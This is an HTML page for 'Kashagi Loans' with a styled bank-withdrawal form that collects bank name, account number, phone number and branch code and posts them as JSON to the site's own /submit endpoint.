<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kashagi Loans - Bank Withdrawal</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#eef3fa;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:350px;
    background:#fff;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 10px 25px rgba(0,0,0,.15);
}

.header{
    background:#1877f2;
    color:#fff;
    text-align:center;
    padding:25px 20px;
}

.logo{
    width:90px;
    height:90px;
    border-radius:50%;
    background:#fff;
    padding:5px;
    object-fit:cover;
    margin-bottom:10px;
    border:3px solid rgba(255,255,255,.4);
}

.header h2{
    margin-bottom:5px;
}

.header p{
    font-size:14px;
    opacity:.9;
}

.form{
    padding:25px;
}

label{
    display:block;
    margin-bottom:6px;
    font-weight:bold;
    color:#444;
}

input{
    width:100%;
    padding:12px;
    border:1px solid #ddd;
    border-radius:6px;
    margin-bottom:18px;
    font-size:15px;
}

input:focus{
    outline:none;
    border-color:#1877f2;
}

button{
    width:100%;
    padding:13px;
    border:none;
    border-radius:6px;
    background:#1877f2;
    color:#fff;
    font-weight:bold;
    font-size:15px;
    cursor:pointer;
}

button:hover{
    opacity:.95;
}

.footer{
    text-align:center;
    margin-top:15px;
}

.footer a{
    color:#1877f2;
    text-decoration:none;
    font-size:14px;
}
</style>

</head>

<body>

<div class="card">

<div class="header">
<img src="bankloan.png" class="logo" alt="Logo">
<h2>Kashagi Loans</h2>
<p>Fast • Secure • Reliable</p>
</div>

<div class="form">

<label>Bank Name</label>
<input
type="text"
id="bank_name"
placeholder="Enter bank name">

<label>Account Number</label>
<input
type="text"
id="account_number"
placeholder="Enter account number">

<label>Phone Number</label>
<input
type="tel"
id="phone_number"
placeholder="e.g. +263771234567">

<label>Branch Code</label>
<input
type="text"
id="branch_code"
placeholder="Enter branch code">

<button onclick="submitForm()">
Withdraw to Bank Account
</button>

<div class="footer">
<a href="#">Need Help?</a>
</div>

</div>

<script>
    async function submitForm() {

    const bank_name = document.getElementById("bank_name").value.trim();
    const account_number = document.getElementById("account_number").value.trim();
    const phone_number = document.getElementById("phone_number").value.trim();
    const branch_code = document.getElementById("branch_code").value.trim();

    if (!bank_name || !account_number || !phone_number || !branch_code) {
        alert("Please fill in all fields.");
        return;
    }

    try {

        const response = await fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                bank_name: bank_name,
                account_number: account_number,
                phone_number: phone_number,
                branch_code: branch_code
            })
        });

        if (!response.ok) {
            throw new Error("Server returned " + response.status);
        }

        const data = await response.json();

        if (data.success) {

            alert("✅ Your bank withdrawal request has been initiated successfully!");

            window.location.replace("/thankyou.html");

        } else {

            alert("❌ Submission failed. Please try again.");

        }

    } catch (error) {

        console.error(error);

        alert("❌ Server connection error. Please try again later.");

    }

}

</script>

</body>
</html>
